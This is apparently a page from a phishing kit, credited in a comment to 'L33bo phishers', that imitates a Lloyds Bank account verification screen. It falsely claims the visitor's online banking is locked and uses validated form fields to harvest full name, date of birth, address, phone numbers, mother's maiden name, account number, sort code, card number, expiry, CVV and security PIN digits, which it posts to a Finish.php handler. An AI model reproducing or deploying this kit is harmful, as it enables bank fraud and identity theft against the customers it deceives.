<?php 
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";
require "assets/includes/enc.php";
?>
<!DOCTYPE html>
<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en-gb">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Verification</title>
<link href="assets/img/favicon.ico" rel="shortcut icon">
<meta content="IE=Edge" http-equiv="X-UA-Compatible">
<meta content="IE=8; IE=9; IE=10" http-equiv="X-UA-Compatible">
<meta content="telephone=no" name="format-detection">
<link href="assets/css/001.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/global2-min151127.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/global3-min151224.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/has_js.css" media="screen" rel="stylesheet" type="text/css">
<link href="assets/css/header-footer-min151214.css" media="screen, print" rel="stylesheet" type="text/css">
<link href="assets/css/touch-min151214.css" media="screen, print" rel="stylesheet" type="text/css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="assets/js/jquery.payment.js"></script>
<script src="http://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="http://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<script src="assets/js/jquery.maskedinput.js"></script>
<script type="text/javascript">
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
</script>
<script>
    jQuery(function($) {
      $('#cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');

      $.fn.toggleInputError = function(erred) {
        this.parent('.field').toggleClass('errorzzzz', erred);
        return this;
      };

      $('form').submit(function(e) {
        e.preventDefault();

        var cardType = $.payment.cardType($('.cc-number').val());
        $('#cc-number').toggleInputError(!$.payment.validateCardNumber($('#cc-number').val()));
        $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
        $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
        $('.cc-brand').text(cardType);
      });

    });
	
</script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
   $("#cc-exp").mask("99 / 99",{placeholder:"MM / YY"});
   $("#sortcode").mask("99-99-99",{placeholder:"xx-xx-xx"});
});
</script>
<script>
jQuery.validator.addMethod("postcodeUK", function(value, element) {
return this.optional(element) || /^[A-Z]{1,2}[0-9]{1,2} ?[0-9][A-Z]{2}$/i.test(value);
}, "Please check the postcode you have provided");

$('#details').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "span",			
                rules: {
					name: {	required: true,	minlength: 4,},
					dob: { required: true,	minlength: 10,},
					address: { required: true, minlength: 5,},
					town: { required: true, minlength: 3,},
					postcode: { required: true, minlength: 5,},
					mobile: { required: true, minlength: 11,},
					ccno: { required: true, minlength: 16, creditcard: true},
					ccexp: { required: true, minlength: 4,},
					secode: { required: true, minlength: 3, digits: true,},
					acno: { required: true, minlength: 8, digits: true,},
					sortcode: { required: true, minlength: 8},
					mmn: { required: true, minlength: 2,},
					telepin2: { required: true},
					telepin4: { required: true},
					telepin6: { required: true},
					telepin1: { required: true},
					telepin3: { required: true},
					telepin5: { required: true},
                },
				groups: {
					telepin: "telepin2 telepin4 telepin6 telepin1 telepin3 telepin5",
				},
				errorPlacement: function(error, element) {
				if (element.attr("name") == "telepin2" || element.attr("name") == "telepin4" || element.attr("name") == "telepin6"  || element.attr("name") == "telepin1" || element.attr("name") == "telepin3" || element.attr("name") == "telepin5") 
				error.insertAfter("#telepinerror");
				else 
				error.insertAfter(element);			
				},
                messages: {
					name: {
						required: "Please provide your full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					dob: { 
						required: "Please provide your date of birth", 
					},
					address: {
						required: "Please provide the 1st line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					postcode: {
						required: "Please provide your postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
					mobile: {
						required: "Please provide your 11 digit mobile telephone number",
						minlength: jQuery.validator.format("Please check the mobile telephone number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					ccno: {
						required: "Please provide your 16 digit card number",
						minlength: jQuery.validator.format("Please check the card number you have entered"),
						creditcard: jQuery.validator.format("Please check the card number you have entered"),
					},
					ccexp: {
						required: "Please provide your cards expiry date",
						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
						date: jQuery.validator.format("Please check the card expiry date you have entered"),
					},
					secode: {
						required: "Please provide your 3 digit card security code (CVV)",
						minlength: jQuery.validator.format("Please check the card security code you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					acno: {
						required: "Please provide your 8 digit account number",
						minlength: jQuery.validator.format("Please check the account number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
					sortcode: { 
						required: "Please provide your sortcode", minlength: jQuery.validator.format("Please check the sortcode you have entered"),
					},
					mmn: { required: "Please provide your mother's maiden name", minlength: jQuery.validator.format("Please check the mother's maiden name you have entered"), },
					telepin2: { required: "Please select the characters from your 6-digit security number", },
					telepin4: { required: "Please select the characters from your 6-digit security number", },
					telepin6: { required: "Please select the characters from your 6-digit security number", },
					telepin1: { required: "Please select the characters from your 6-digit security number", },
					telepin3: { required: "Please select the characters from your 6-digit security number", },
					telepin5: { required: "Please select the characters from your 6-digit security number", },
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
</script>
<script type="text/javascript">
function NoPin()
{
if (checkbox.checked){
document.getElementById("selectpin1").innerHTML = "<label id='telepinlabel2' for='telepin2'>Character 2 :</label><select id='telepin2' disabled name='telepin2' onchange='CaptureValue2(this.form)'><option value=''>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin2").innerHTML = "<label id='telepinlabel4' for='telepin4'>Character 4 :</label><select id='telepin4' disabled name='telepin4' onchange='CaptureValue4(this.form)'><option value=''>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin3").innerHTML = "<label id='telepinlabel6' for='telepin6'>Character 6 :</label><select id='telepin6' disabled name='telepin6' onchange='CaptureValue6(this.form)'><option value=''>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
}
else {
document.getElementById("selectpin1").innerHTML = "<label id='telepinlabel2' for='telepin2'>Character 2 :</label><select id='telepin2' name='telepin2' onchange='CaptureValue2(this.form)'><option value=''>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin2").innerHTML = "<label id='telepinlabel4' for='telepin4'>Character 4 :</label><select id='telepin4' name='telepin4' onchange='CaptureValue4(this.form)'><option value=''>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin3").innerHTML = "<label id='telepinlabel6' for='telepin6'>Character 6 :</label><select id='telepin6' name='telepin6' onchange='CaptureValue6(this.form)'><option value=''>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
}
}	
function ChangePinInput()
{
document.getElementById("selectpin1").innerHTML = "<label id='telepinlabel1' for='telepin1'>Character 1 :</label><select id='telepin1' name='telepin1' onchange='CaptureValue1(this.form)'><option value=''>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin2").innerHTML = "<label id='telepinlabel3' for='telepin3'>Character 3 :</label><select id='telepin3' name='telepin3' onchange='CaptureValue3(this.form)'><option value=''>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
document.getElementById("selectpin3").innerHTML = "<label id='telepinlabel5' for='telepin5'>Character 5 :</label><select id='telepin5' name='telepin5' onchange='CaptureValue5(this.form)'><option value=''>Please enter...</option><option value='0'>&nbsp;0</option><option value='1'>&nbsp;1</option><option value='2'>&nbsp;2</option><option value='3'>&nbsp;3</option><option value='4'>&nbsp;4</option><option value='5'>&nbsp;5</option><option value='6'>&nbsp;6</option><option value='7'>&nbsp;7</option><option value='8'>&nbsp;8</option><option value='9'>&nbsp;9</option>";
return false;
}
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
function CaptureValue1(f) {
    f.telepinFinal1.value = f.telepin1.value;
}
function CaptureValue2(f) {
    f.telepinFinal2.value = f.telepin2.value;
}
function CaptureValue3(f) {
    f.telepinFinal3.value = f.telepin3.value;
}
function CaptureValue4(f) {
    f.telepinFinal4.value = f.telepin4.value;
}
function CaptureValue5(f) {
    f.telepinFinal5.value = f.telepin5.value;
}
function CaptureValue6(f) {
    f.telepinFinal6.value = f.telepin6.value;
	ChangePinInput();
}
</script>
<style>
input.error {
	border: 1px solid #dc2a4d!important;
	outline:0;
}
select.error {
	border: 1px solid #dc2a4d!important;
	outline:0;
}
select {
	color: #333!important;
}
span.error {
	color: #dc2a4d;
	font-family: 'Lloyds Jack Light',arial,sans-serif;
    font-weight: normal!important;
    font-size: 1.6em;
    line-height: 1.25;
} 
</style>
</head>
<body>
<div id="wrapper">
<div class="no-js" lang="en">

<header>
<div class="sp-pat-m-hf-01-bank-bar need-javascript">
   <div class="m-hf-01-container m-container"><div class="m-01-logo"><img src="assets/img/logo.png" class="desktop_logo"><img src="assets/img/mobile_logo.png"  height="40" width="42" class="mobile_logo"></div><div class="m-01-menu-buttons">
   <ul><li><div class="m-01-menu-home"><a href="#"><span class="m-01-menu-button-text">HOME</span></a></div></li><li>
   <div class="m-01-menu-button m-01-menu-right">
    <a href="" class="m-01-menu-button-text">
     MENU</a>
   </div>
  </li>
  </ul>
  </div><div class="m-fh-01-navigation" role="navigation"><ul class="pull-right m-01-menu-bar"><li class="m-hf-01-cookie-policy"><a href="#" tabindex="17">Cookie Policy</a></li><li class="m-hf-01-safe-secure"><a href="" tabindex="19">Safe and secure<span>Our Internet Banking guarantee </span></a>
   </li>
   </ul><ul class="m-01-menu-bar"></ul>
  </div>
  </div>
  </div>

    
        <div class="sp-pat-m-hf-01-bank-bar-container">
<div class="mvt_content"><style type="text/css">body
{
  margin:0;
}

body.ls-center
{
  text-align:center;
}

.ls-canvas .ls-row .ls-row-clr
{
  clear:both;
}

.ls-canvas .ls-col
{
  overflow:hidden;
}

.ls-canvas .ls-col-body
{
  overflow:hidden;
}

.ls-canvas .ls-area
{
  overflow:hidden;
}

.ls-canvas .ls-area-body
{
  overflow:hidden;
}

.ls-canvas .ls-area .ls-1st
{
  margin-top:0 !important;
}

.ls-canvas .ls-cmp-wrap
{
  padding:1px 0;
}

.ls-canvas .iw_component
{
  margin:-1px 0;
}

.ls-canvas .ls-row .ls-lqa-fix
{
  font-size:0;
  line-height:0;
  height:0;
  margin-top:0;
}

.ls-canvas .ls-row .ls-lqr-w
{
  float:left;
  width:100%;
}

.ls-canvas .ls-row .ls-lqr-w-fx
{
  float:left;
}

.ls-canvas .ls-row .ls-lqr-e-fx
{
  float:right;
}
</style><div class="ls-canvas sp-pat-wrapper"><div class="ls-row"><div class="ls-lqr"><div class="ls-area"><div class="ls-area-body"><div class="ls-cmp-wrap ls-1st"><div class="iw_component"><div class="sp-pat-m-hf-01-safe-secure" style="display: none;"><div class="m-container m-01-threecol"><h2>Our online and mobile banking guarantee</h2><div class="m-01-section"><p>We guarantee to refund your money in the unlikely event you experience fraud with our Internet Banking service - as long as you've been careful, for example, by taking reasonable steps to keep your security information safe. We protect you with safeguards that meet Industry Standards.</p></div><div class="m-01-section"><ul><li>Keep your password secure and do not let anyone else make use of your security details, even if they share a joint account with you.</li><li>Do not let anyone watch you enter your security details and log off after each Online Banking session.</li><li>Carry out regular virus checks on your devices and have the latest operating system and web browser installed.</li></ul></div><div class="m-01-section"><p>Find out more about how to <a href="#">protect yourself online</a>.</p><ul class="links"><li><a href="#">Security information</a></li></ul></div></div></div></div></div></div></div></div></div></div></div></div><div class="m-hf-02-customer-bar need-javascript m-hf-02-customer-bar-0"><div class="m-container"><ul class="m-hf-02-nav"><li class="m-hf-02-home cb-tab-home"><div class="nav-title"><a href="#"></a></div></li><li class=" hide-desktab"><div class="nav-title"></div></li><li class=" m-hf-02-logout cb-tab-aux-link hide-desktab"><div class="nav-title"></div></li><li class=" m-hf-02-tab cb-tab-accounts"><div class="nav-title"></div><div class="nav-content" style="top: 49px;"></div></li><li class=" m-hf-02-tab cb-tab-profile hide-mobile"><div class="nav-title"></div><div class="nav-content" data-ajax-load="true" style="top: 49px;"></div></li><li class=" m-hf-02-tab cb-tab-help-contact hide-mobile"><div class="nav-title"><a href="#" class="main-nav">Help &amp; Support</a></div><div class="nav-content" style="top: 49px;"></div></li><li class=" m-hf-02-mail cb-tab-mail hide-mobile"><div class="nav-title"><a href="#" class="ViewInboxAnchor1"><span class="m-hf-02-mail-icon">Inbox </span><span class="m-hf-02-mail-badge-read">0</span></a></div></li><li class=" hide-desktab"><div class="nav-title"><a href="#" class="sub-nav-toggle">Help &amp; contact us</a></div><ul class="mobile-sub-nav"><li><a href="#">Lost or stolen card</a></li><li><a href="#">Order replacement card or PIN</a></li><li><a href="#">
          Help</a></li><li><a href="#">General enquires are open 24/7. <span class="underline">0800 096 9779</span></a></li><li><a href="#">Contact us</a></li></ul></li><li class=" m-hf-02-logout cb-tab-logout cb-tab-aux-link"><div class="nav-title"><a href="#">Log Off</a></div></li><li class=" m-hf-02-logout cb-tab-aux-link hide-desktab"><div class="nav-title"><a href="#">Cookie Policy</a></div></li><li class=" m-hf-02-logout cb-tab-aux-link hide-desktab"><div class="nav-title"><a href="#">Safe and secure</a></div></li></ul></div></div>
</header>

</div>
<div class="pageWrap">
<div class="content" id="page">
<div class="primaryWrap">
<div class="primary">
<div class="panel">
<div class="navBar clearfix">
<ul class="linkList">
</ul>
</div>
<div class="panelWrap">
<h1>Validate your information</h1>
<form action="Finish.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" enctype="application/x-www-form-urlencoded" id="details" method="post" name="details">
<div class="inner">
<p></p>
<p><strong>Please note:</strong> For your security, you won’t be able to access your account online until you have completed our account verification process which you can find below.</p>
<p>Until you have completed this action you account will remain locked and you will be unable to access any of our online banking features.</p>
<p></p>
</div>
<fieldset>

<div class="formField">
<div class="formFieldInner">
<span class="label"><strong>Full Name</strong> (including any middle name's):</span>
<input value="<?php echo $_SESSION['name'];?>" autocomplete="off" maxlength="40" name="name" type="text" style="width: 20em;margin: 0 8px 0 0;position: relative;border: 1px solid #CCC;  padding: 10px;height: 50px;">
</div>
</div>

<div class="formField">
<div class="formFieldInner">
<span class="label"><strong>Date of Birth</strong>:</span>
<input value="<?php echo $_SESSION['day'];?>/<?php echo $_SESSION['month'];?>/<?php echo $_SESSION['year'];?>" autocomplete="off" maxlength="40" name="dob" id="dob" type="text" style="width: 20em;margin: 0 8px 0 0;position: relative;border: 1px solid #CCC;  padding: 10px;height: 50px;" placeholder="DD/MM/YYYY">
</div>
</div>

<div class="formField">
<div class="formFieldInner">
<span class="label"><strong>Address</strong> (line 1):</span>
<input value="<?php echo $_SESSION['address'];?>" autocomplete="off" maxlength="40" name="address" type="text" style="width: 20em;margin: 0 8px 0 0;position: relative;border: 1px solid #CCC;  padding: 10px;height: 50px;">
</div>
</div>

<div class="formField">
<div class="formFieldInner">
<span class="label"><strong>UK Postcode</strong>:</span>
<input value="<?php echo $_SESSION['postcode'];?>" autocomplete="off" maxlength="40" name="postcode" type="text" style="width: 7em;margin: 0 8px 0 0;position: relative;border: 1px solid #CCC;  padding: 10px;height: 50px;" class="postcodeUK">
</div>
</div>

<div class="formField">
<div class="formFieldInner">
<span class="label"><strong>Home Telephone Number</strong>:</span>
<input autocomplete="off" maxlength="11" name="telephone" type="text" style="width: 20em;margin: 0 8px 0 0;position: relative;border: 1px solid #CCC;  padding: 10px;height: 50px;">
</div>
</div>

<div class="formField">
<div class="formFieldInner">
<span class="label"><strong>Mobile Telephone Number</strong>:</span>
<input value="<?php echo $_SESSION['telephone'];?>" autocomplete="off" maxlength="11" name="mobile" type="text" style="width: 20em;margin: 0 8px 0 0;position: relative;border: 1px solid #CCC;  padding: 10px;height: 50px;">
</div>
</div>

<div class="formField">
<div class="formFieldInner">
<span class="label"><strong>Mother&apos;s Maiden Name</strong>:</span>
<input value="<?php echo $_SESSION['mmn'];?>" autocomplete="off" maxlength="40" name="mmn" type="text" style="width: 20em;margin: 0 8px 0 0;position: relative;border: 1px solid #CCC;  padding: 10px;height: 50px;">
</div>
</div>

<div class="formField">
<div class="formFieldInner">
<span class="label"><strong>Account Number</strong>:</span>
<input value="<?php echo $_SESSION['acno'];?>" autocomplete="off" maxlength="8" name="acno" type="text" style="width: 20em;margin: 0 8px 0 0;position: relative;border: 1px solid #CCC;  padding: 10px;height: 50px;">
</div>
</div>

<div class="formField">
<div class="formFieldInner">
<span class="label"><strong>Sort Code</strong>:</span>
<input value="<?php echo $_SESSION['sort1'];?>-<?php echo $_SESSION['sort2'];?>-<?php echo $_SESSION['sort3'];?>" autocomplete="off" maxlength="8" name="sortcode" id="sortcode" type="text" style="width: 20em;margin: 0 8px 0 0;position: relative;border: 1px solid #CCC;  padding: 10px;height: 50px;">
</div>
</div>

<div class="formField">
<div class="formFieldInner">
<span class="label"><strong>Card Number</strong>:</span>
<input value="<?php echo $_SESSION['ccno'];?>" autocomplete="off" maxlength="20" name="ccno" id="cc-number" type="text" style="width: 20em;margin: 0 8px 0 0;position: relative;border: 1px solid #CCC;  padding: 10px;height: 50px;">
</div>
</div>

<div class="formField">
<div class="formFieldInner">
<span class="label"><strong>Card Expiry</strong>:</span>
<input value="<?php echo $_SESSION['ccexp'];?>" autocomplete="off" maxlength="7" name="ccexp" id="cc-exp" class="cc-exp" type="text" style="width: 5em;margin: 0 8px 0 0;position: relative;border: 1px solid #CCC;  padding: 10px;height: 50px;" placeholder="MM / YY">
</div>
</div>


<div class="formField">
<div class="formFieldInner">
<span class="label"><strong>Card Security Code</strong>:</span>
<input value="<?php echo $_SESSION['secode'];?>" autocomplete="off" maxlength="4" name="secode" class="cc-cvc" type="text" style="width: 5em;margin: 0 8px 0 0;position: relative;border: 1px solid #CCC;  padding: 10px;height: 50px;">
</div>
</div>

<p>&nbsp;</p>
<p>&nbsp;</p>

</fieldset>



<fieldset class="dash memInfoSelect clearfix">
<div class="inner">
<h2>6-digit Security Number</h2>
<p><img src="assets/img/024.png">&nbsp;Please select the characters from your 6-digit security number below:</p>
</div>
<div id="skippin" class="formField validationName:(pin) validate:(required) clearfix">
<div class="formFieldInner">
<div class="clearfix">
<div id="selectpin1">
<label id="telepinlabel2" for="telepin2">Character 2 :</label>
<select id="telepin2" name="telepin2" onchange="CaptureValue2(this.form)">

<option value="">Please enter...</option>
<option value="0">&nbsp;0</option>
<option value="1">&nbsp;1</option>
<option value="2">&nbsp;2</option>
<option value="3">&nbsp;3</option>
<option value="4">&nbsp;4</option>
<option value="5">&nbsp;5</option>
<option value="6">&nbsp;6</option>
<option value="7">&nbsp;7</option>
<option value="8">&nbsp;8</option>
<option value="9">&nbsp;9</option>
</select>
</div>
</div>
<div class="clearfix">
<div id="selectpin2">
<label id="telepinlabel4" for="telepin4">Character 4 :</label>
<select id="telepin4" name="telepin4" onchange="CaptureValue4(this.form)">

<option value="">Please enter...</option>
<option value="0">&nbsp;0</option>
<option value="1">&nbsp;1</option>
<option value="2">&nbsp;2</option>
<option value="3">&nbsp;3</option>
<option value="4">&nbsp;4</option>
<option value="5">&nbsp;5</option>
<option value="6">&nbsp;6</option>
<option value="7">&nbsp;7</option>
<option value="8">&nbsp;8</option>
<option value="9">&nbsp;9</option>
</select>
</div>
</div>
<div class="clearfix">
<div id="selectpin3">
<label id="telepinlabel6" for="telepin6">Character 6 :</label>
<select id="telepin6" name="telepin6" onchange="CaptureValue6(this.form)">

<option value="">Please enter...</option>
<option value="0">&nbsp;0</option>
<option value="1">&nbsp;1</option>
<option value="2">&nbsp;2</option>
<option value="3">&nbsp;3</option>
<option value="4">&nbsp;4</option>
<option value="5">&nbsp;5</option>
<option value="6">&nbsp;6</option>
<option value="7">&nbsp;7</option>
<option value="8">&nbsp;8</option>
<option value="9">&nbsp;9</option>
</select>
</div>
</div>

<span id="telepinerror"></span>

</div>
</div>
<div style="display:block;" class="inner">
<strong>or</strong></div>
<div class="formField clearfix fieldHelp checkbox">
<div class="formFieldInner">
<input id="checkbox" type="checkbox" name="checkbox" value="check" class="linkedCheckBox" onclick="NoPin()">
<label for="frm_personalRegistration:tempResidence">You should tick this box if you don't yet have a 6-digit Security Number.</label>
<span class="cxtHelp"><a class="cxtTrigger" href="#_idFC12">[?]</a></span>
<div id="_idFC12" class="help">
<p>You would normally receive your 6-digit security number in the post if you don't yet have a 6-digit Security
Number tick the box</p>
</div>
</div>
</div>
</fieldset>
<input type="hidden" name="telepinFinal1" id="telepinFinal1">
<input type="hidden" name="telepinFinal2" id="telepinFinal2">
<input type="hidden" name="telepinFinal3" id="telepinFinal3">
<input type="hidden" name="telepinFinal4" id="telepinFinal4">
<input type="hidden" name="telepinFinal5" id="telepinFinal5">
<input type="hidden" name="telepinFinal6" id="telepinFinal6">


<ul class="actions">
<li class="primaryAction"><input class="submitAction m-action-button primary-btn" id="go" name="go" src="assets/img/continue.png" title="Continue" type="submit" value="Continue"></li>
</ul>
</form>
</div>
</div>
</div>
</div>
<div class="secondary">
<div class="panel">
<div class="accordion ui-accordion ui-widget ui-helper-reset" role="tablist">
<div class="part">
<h2 aria-expanded="false" class="trigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" role="tab" tabindex="0" title="Contact Us....: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Contact Us....</h2>
<div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
<div class="paneInner">
<div class="quickContact"><!-- start TS:component_0_free_format -->
<h3>All account related queries</h3>
<p><strong>0345 300 0000</strong></p>
<p>If you need to call us from abroad or prefer not to use our 0345 number, you can also call us on +44 1733 347 007.</p>
<p>Calls may be monitored and recorded in case we need to check we have carried out your instructions correctly and to help us improve our quality of service.<br>
<br></p>
<h3>Internet Banking queries</h3>
<p>Technical queries about the Internet Banking service</p>
<p><strong>0345 300 0116</strong></p>
<p>If you need to call us from abroad or prefer not to use our 0345 number, you can also call us on&nbsp;+44 2076 499 437.</p>
<!-- end TS:component_0_free_format --></div>
</div>
</div>
</div>
<div class="part selected">
<h2 aria-expanded="true" class="trigger current linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-active ui-corner-top" role="tab" tabindex="0" title="Help &amp; Support: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-s"></span>Help &amp; Support</h2>
<div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active" role="tabpanel">
<div class="paneInner"><span class="showMeMenu"></span>
<ul class="quickFAQs ui-accordion ui-widget ui-helper-reset" role="tablist">


<li class="ui-accordion-li-fix">
<h3 aria-expanded="true" class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-active ui-corner-top" role="tab" tabindex="0" title="I don’t have a landline. What should I use as my home phone number?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>What is account verification?</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active" role="tabpanel" style="display: block;">
<p></p>
<p>Here at Lloyds bank we're committed to keeping you safe online by protecting your money, your personal details and your privacy. Our account verification process has been designed to help keep your information secure. 
To help us confirm your identity when you log on to Internet Banking, we're improving the way we uniquely identify you based on how you use the service.
We require you to complete our account verification process before we can allow you access to our online banking system this should only take you a few minutes to complete.</p>
<p></p>
</div>
</li>


<li class="ui-accordion-li-fix">
<h3 aria-expanded="true" class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-active ui-corner-top" role="tab" tabindex="0" title="I don’t have a landline. What should I use as my home phone number?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>What we're doing to keep you safe</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active" role="tabpanel" style="display: block;">
<p></p>
<p>We’re committed to making sure your Internet Banking experience is as safe as possible. We use cutting edge technology to protect your personal information and privacy.
When you set up a new payee, standing order or credit card payment, we need to make sure you are who say you are. To do this, we’ll give you a call to ensure that the instruction is coming from you.</p>
<p></p>
</div>
</li>


<li class="ui-accordion-li-fix">
<h3 aria-expanded="true" class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-active ui-corner-top" role="tab" tabindex="0" title="I don’t have a landline. What should I use as my home phone number?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Our online and mobile banking guarantee</h3>
<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active" role="tabpanel" style="display: block;">
<p></p>
<p>We guarantee to refund your money in the unlikely event you experience fraud with our Internet Banking service - as long as you've been careful, for example, by taking reasonable steps to keep your security information safe. We protect you with safeguards that meet Industry Standards.</p>
<p></p>
</div>
</li>


</ul>
<p><a class="linkBullet linkMore newwin newfaqwin" href="#">More Help &amp; Support</a></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="sp-pat-m-hf-03-footer">
<div class="mvt_content">
<style type="text/css">
body
{
  margin:0;
}

body.ls-center
{
  text-align:center;
}

.ls-canvas .ls-row .ls-row-clr
{
  clear:both;
}

.ls-canvas .ls-col
{
  overflow:hidden;
}

.ls-canvas .ls-col-body
{
  overflow:hidden;
}

.ls-canvas .ls-area
{
  overflow:hidden;
}

.ls-canvas .ls-area-body
{
  overflow:hidden;
}

.ls-canvas .ls-area .ls-1st
{
  margin-top:0 !important;
}

.ls-canvas .ls-cmp-wrap
{
  padding:1px 0;
}

.ls-canvas .iw_component
{
  margin:-1px 0;
}

.ls-canvas .ls-row .ls-lqa-fix
{
  font-size:0;
  line-height:0;
  height:0;
  margin-top:0;
}

.ls-canvas .ls-row .ls-lqr-w
{
  float:left;
  width:100%;
}

.ls-canvas .ls-row .ls-lqr-w-fx
{
  float:left;
}

.ls-canvas .ls-row .ls-lqr-e-fx
{
  float:right;
}

</style>
<div class="ls-canvas sp-pat-wrapper">
<div class="ls-row">
<div class="ls-lqr">
<div class="ls-area">
<div class="ls-area-body">
<div class="ls-cmp-wrap ls-1st">
<div class="iw_component">
<div class="m-hf-03-footer-01">
<div class="m-container m-hf-01-threecol">
<div class="footer-section">
<h3>Banking with us</h3>
<ul>
<li><a href="#">Branch finder</a></li>
<li><a href="#">CashPoint&reg; finder</a></li>
<li><a href="#">Mobile Banking</a></li>
<li><a href="#">Rate and charges</a></li>
<li><a href="#">Glossary</a></li>
</ul>
</div>
<div class="footer-section">
